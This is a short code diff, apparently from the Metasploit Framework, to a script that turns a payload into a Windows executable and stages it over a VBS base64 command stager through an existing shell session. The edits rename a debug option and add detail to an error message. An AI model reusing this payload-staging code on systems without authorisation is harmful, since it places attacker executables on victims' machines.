@@ -83,7 +83,7 @@ begin
 	opts = {
 		:linemax => 1700,
 		:decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
-		#:persist => true # keep temp files (for debugging)
+		#:nodelete => true # keep temp files (for debugging)
 	}
 	exe = Msf::Util::EXE.to_executable(framework, larch, lplat, buf)
 
@@ -112,7 +112,8 @@ begin
 	cmds.each { |cmd|
 		ret = session.shell_command_token_win32(cmd)
 		if (not ret)
-			print_error("Error: Unable to execute command!")
+			print_error("Error: Unable to execute the following command:")
+			print_error(cmd.inspect)
 			aborted = true
 		else
 			ret.strip!
